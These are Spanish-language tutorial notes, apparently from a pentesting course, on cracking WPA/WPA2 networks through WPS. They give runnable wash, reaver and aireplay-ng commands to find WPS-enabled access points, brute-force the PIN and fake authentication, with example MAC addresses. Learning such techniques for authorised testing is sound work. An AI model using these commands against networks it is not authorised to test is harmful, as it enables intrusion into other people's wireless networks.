# WPA | WPA2 Cracking

- Ambos pueden ser crakeados por los mismos métodos.
- Creado para "mitigar" los problemas presentados en WEP.
- Más seguro.
- Cada paquete es cifrado usando una llave única temporal.
- Los paquetes no contienen información útil.

## Abusando WPS

### Consideraciones

- WPS es una característica que puede ser usada en WPA y WPA2.
- Permite a los clientes conectarse sin proporcionar contraseña.
- La autenticación es realizada usando un pin de 9 dígitos.
  - Siendo 8 dígitos una longitud muy pequeña.
  - Se puede intentar probar con todos los pins probables en un periodo relativamente corto.
  - Posteriormente se puede usar el pin WPS para calcular la contraseña actual.

*Nota: Esto sólo funcionaría si el router está configurado para no usar PBC (Push Button Authentication).*

### Ejecución

1. Visualizar las redes que tengan WPS habilitado

```bash
wash --interface <interfaz en modo monitor>
wash --interface mon0
```

2. Lanzar ataque de fuerza bruta.

```bash
reaver --bssid <MAC Address de objetivo> --channel <canal del AP> --interface <interfaz en modo monitor> -vvv --no-associate
reaver --bssid F8:23:B2:B9:50:A8 --channel 1 --interface wlan1 -vvv --no-associate
```

*Nota: Tener en consideración que kali cuenta con versiones más recientes lo que puede causar un error similar a `send_packet called from resend_last_packet() send.c:161` si es el caso se recomienda usar la versión 1.6.1, incluida en [el repositorio](../files/reaver_1_6_1).*

3. Lanzar ataque de `Fake Authentication`.

```bash
aireplay-ng --fakeauth 30 -a <MAC Address de objetivo> -h <MAC Address de adaptador wireless> <interfaz en modo monitor>
aireplay-ng --fakeauth 30 -a F8:23:B2:B9:50:A8 -h 48:5D:60:2A:45:25 mon0
```

